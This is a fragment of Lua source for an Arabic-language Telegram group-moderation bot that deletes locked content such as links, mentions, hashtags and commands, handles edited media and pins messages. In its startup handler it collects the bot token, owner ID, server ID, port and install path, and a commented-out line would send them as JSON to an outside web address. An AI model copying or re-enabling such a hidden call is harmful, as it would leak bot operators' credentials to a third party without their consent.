SourceBlack(data.message_,data)
plugin_Dev3Yad(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
GetMsgInfo(data.chat_id_,data.message_id_,function(arg,data)
msg = data
msg.edited = true
msg.text = data.content_.text_
input_inFo(msg)  
end,nil)
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n⋄شخص ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد ادمن"
end
send(msg.chat_id_,0,''..t..'\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄تم التعديل على الميديا\n⋄الشخص الي قام بالتعديل\n⋄ايدي الشخص ◂ '..result.sender_user_id_..'\n⋄معرف الشخص»{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
local BlackAbot = database:get(bot_id.."Black1:Add:Filter:Rp2"..text..result.chat_id_)   
if BlackAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⋄العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⋄["..BlackAbot.."] \n") 
else
send(msg.chat_id_,0," ⋄العضو : {["..data.first_name_.."](T.ME/SOPOWERB0T)}\n⋄["..BlackAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local Black1_Msg = database:get(bot_id.."Black1:Add:Filter:Rp2"..text..result.chat_id_)   
if Black1_Msg then    
send(msg.chat_id_, msg.id_," ⋄"..Black1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
infos = {} 
infos.sudoid = SUDO
infos.sudouser  = database:get(id_server..":SUDO_USERNAME")
infos.userbot = database:get(id_server..":token_username")
infos.token  = token
infos.id_server = id_server
infos.name = Name
infos.port = Port
infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
----https.request('https://veer.saied.us/boyka/request.php?insert='..JSON.encode(infos))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         

local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


end -- end new msg dev.mr sofi 
end -- end callback dev.mr sofi
















